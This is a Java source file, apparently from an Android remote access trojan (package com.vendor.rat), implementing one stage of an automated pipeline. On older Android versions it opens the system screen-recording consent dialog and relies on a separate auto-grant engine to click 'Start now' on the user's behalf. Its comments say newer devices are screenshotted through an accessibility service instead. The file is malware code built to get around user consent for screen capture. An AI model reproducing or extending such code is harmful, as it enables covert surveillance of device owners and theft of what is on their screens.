package com.vendor.rat.auto.pipeline.stage;

import android.os.Build;
import android.util.Log;

import com.vendor.rat.activity.ActivMain;
import com.vendor.rat.auto.pipeline.PipelineContext;
import com.vendor.rat.auto.pipeline.PipelineStage;

/**
 * Stage 8: 请求 MediaProjection 权限
 *
 * 仅 API < 30 设备需要（API 30+ 使用 AccessibilityService.takeScreenshot）。
 * 触发系统录屏授权弹窗，PermissionAutoGrantEngine 自动点击"立即开始"。
 */
public class MediaProjectionStage implements PipelineStage {

    private static final String TAG = "MediaProjectionStage";

    @Override
    public void handle(PipelineContext passable, Runnable next) {
        // API 30+ 使用 AccessibilityService.takeScreenshot()，不需要 MediaProjection
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            next.run();
            return;
        }

        Log.d(TAG, "Requesting MediaProjection for API " + Build.VERSION.SDK_INT);

        ActivMain.triggerMediaProjectionRequest();

        // 等待系统弹窗 + PermissionAutoGrantEngine 自动点击
        try { Thread.sleep(3000); } catch (InterruptedException ignored) {}

        passable.setMediaProjectionGranted(true);
        Log.d(TAG, "MediaProjection request completed");
        next.run();
    }
}
